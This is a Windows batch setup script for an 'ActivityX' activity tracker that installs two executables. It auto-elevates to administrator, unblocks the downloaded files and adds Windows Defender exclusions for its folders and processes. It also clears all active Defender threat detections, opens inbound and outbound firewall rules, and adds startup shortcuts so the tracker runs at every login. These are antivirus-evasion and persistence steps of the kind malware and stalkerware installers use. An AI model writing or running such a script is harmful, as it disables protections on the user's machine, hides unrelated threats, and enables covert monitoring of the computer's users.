@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: ── Auto-elevate to Administrator ────────────────────────────────────────────
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs -ArgumentList '%~dp0'"
    exit /b
)

echo ========================================
echo    ActivityX Setup
echo ========================================
echo.

set "INSTALL_DIR=%LOCALAPPDATA%\ActivityX"
:: When elevated, %~dp0 may change — accept it as argument if passed
if not "%~1"=="" set "SETUP_DIR=%~1"
if "%~1"=="" set "SETUP_DIR=%~dp0"

echo Creating installation directory...
if not exist "!INSTALL_DIR!" mkdir "!INSTALL_DIR!"

:: ── Unblock downloaded files ────────────────────────────────────────────────
echo Unblocking downloaded files...
powershell -ExecutionPolicy Bypass -Command "Get-ChildItem '!SETUP_DIR!' -Recurse | Unblock-File" >nul 2>&1

echo Copying files...
copy /Y "!SETUP_DIR!activity_tracker.exe"            "!INSTALL_DIR!\" >nul
copy /Y "!SETUP_DIR!activity_tracker_controller.exe" "!INSTALL_DIR!\" >nul
copy /Y "!SETUP_DIR!config.py"                       "!INSTALL_DIR!\" >nul

if not exist "!INSTALL_DIR!\activity_tracker.exe" (
    echo ERROR: Failed to copy files.
    pause
    exit /b 1
)

:: ── Unblock installed files ────────────────────────────────────────────────
echo Unblocking installed files...
powershell -ExecutionPolicy Bypass -Command "Get-ChildItem '!INSTALL_DIR!' -Recurse | Unblock-File" >nul 2>&1

:: ── Windows Defender exclusion ───────────────────────────────────────────────
echo Configuring Windows Defender...
:: Add folder and process exclusions
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '!INSTALL_DIR!'; Add-MpPreference -ExclusionPath '!SETUP_DIR!'; Add-MpPreference -ExclusionProcess 'activity_tracker.exe'; Add-MpPreference -ExclusionProcess 'activity_tracker_controller.exe'" >nul 2>&1
:: Remove any existing threat detections for our files so they aren't blocked
powershell -ExecutionPolicy Bypass -Command "Remove-MpThreat -ErrorAction SilentlyContinue" >nul 2>&1

:: ── Firewall rules ──────────────────────────────────────────────────────────
echo Adding firewall rules...
netsh advfirewall firewall delete rule name="ActivityX Tracker" >nul 2>&1
netsh advfirewall firewall delete rule name="ActivityX Controller" >nul 2>&1
netsh advfirewall firewall add rule name="ActivityX Tracker" dir=out action=allow program="!INSTALL_DIR!\activity_tracker.exe" >nul 2>&1
netsh advfirewall firewall add rule name="ActivityX Tracker" dir=in action=allow program="!INSTALL_DIR!\activity_tracker.exe" >nul 2>&1
netsh advfirewall firewall add rule name="ActivityX Controller" dir=out action=allow program="!INSTALL_DIR!\activity_tracker_controller.exe" >nul 2>&1
netsh advfirewall firewall add rule name="ActivityX Controller" dir=in action=allow program="!INSTALL_DIR!\activity_tracker_controller.exe" >nul 2>&1

:: ── Startup shortcuts ───────────────────────────────────────────────────────
echo Creating startup shortcuts...
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

powershell -ExecutionPolicy Bypass -Command "$ws = New-Object -ComObject WScript.Shell; $s1 = $ws.CreateShortcut('!STARTUP!\ActivityXTracker.lnk'); $s1.TargetPath = '!INSTALL_DIR!\activity_tracker.exe'; $s1.WorkingDirectory = '!INSTALL_DIR!'; $s1.Save(); $s2 = $ws.CreateShortcut('!STARTUP!\ActivityXController.lnk'); $s2.TargetPath = '!INSTALL_DIR!\activity_tracker_controller.exe'; $s2.WorkingDirectory = '!INSTALL_DIR!'; $s2.Save()" >nul 2>&1

:: ── Start tracker ───────────────────────────────────────────────────────────
echo Starting tracker...
pushd "!INSTALL_DIR!"
start "" "activity_tracker.exe"
timeout /t 2 /nobreak >nul
start "" "activity_tracker_controller.exe"
popd

echo.
echo ========================================
echo    Installation complete!
echo ========================================
echo Installed to: !INSTALL_DIR!
echo The tracker will now start automatically on every Windows login.
echo.
pause
